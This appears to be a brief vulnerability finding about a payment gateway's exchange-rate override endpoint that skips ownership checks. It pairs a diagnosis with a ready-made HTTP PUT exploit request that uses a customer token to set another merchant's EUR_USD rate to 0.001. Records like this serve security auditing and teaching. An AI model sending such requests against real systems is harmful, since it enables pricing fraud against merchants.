diagnosis: MerchantExchangeRateOverrideView allows setting custom foreign exchange conversion rates for any merchant_id and currency_pair without checking that request.user owns or manages that merchant account. An attacker can set an artificial exchange rate (e.g. 0.001 EUR to USD) on a competitor's storefront, causing severe undercharging during multi-currency checkout.
exploit_request:
PUT /api/merchants/804/fx-rates/EUR_USD/ HTTP/1.1
Host: pay.multicurrencygw.io
Authorization: Bearer customer_user_token
Content-Type: application/json

{"custom_rate": "0.001"}
